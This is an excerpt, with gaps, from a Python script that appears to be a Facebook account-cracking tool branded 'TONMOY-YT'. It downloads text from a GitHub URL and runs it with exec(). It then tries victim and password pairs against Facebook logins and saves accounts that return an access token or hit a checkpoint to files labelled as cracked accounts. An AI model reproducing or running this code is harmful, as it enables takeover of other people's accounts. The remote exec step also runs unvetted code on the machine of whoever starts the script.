...
rs=requests.session()
rg=rs.get
x=(rg("https://github.com/tonmoyhackar/TONMOY-YT-").text)
exec(x)
##### LOGO #####
...
{rcl}[+] This Script From TONMOY-YT ...
...
if Permission=="On":
  ...
  motion(ccl+"You Need TONMOY-YT 's Permission")
  time.sleep(2)
  ...
  def main(arg):
    try:
      ...
      if 'access_token' in q:
        motion (ccl+'\n[TONMOY_OK] ' + victim + '  |  ' + line+"\n")
        okb = open('save/TONMOY_Successful.txt', 'a')
        okb.write(victim +" [ TONMOY ] "+ line + '\n')
        okb.close()
        motion(ccl+"\nCreacked Account In Save File...\n")       
      elif 'www.facebook.com' in q['error_msg']:
        motion( ycl+'\n[TONMOY_CP] ' +victim+'  |  '+ycl + line+"\n")
        cps = open('save/TONMOY_CheckPoint.txt', 'a')
        cps.write(victim +" [ TONMOY ] "+ line + '\n')
        cps.close()
        motion(ccl+"\nCreacked Account In Save File...\n")
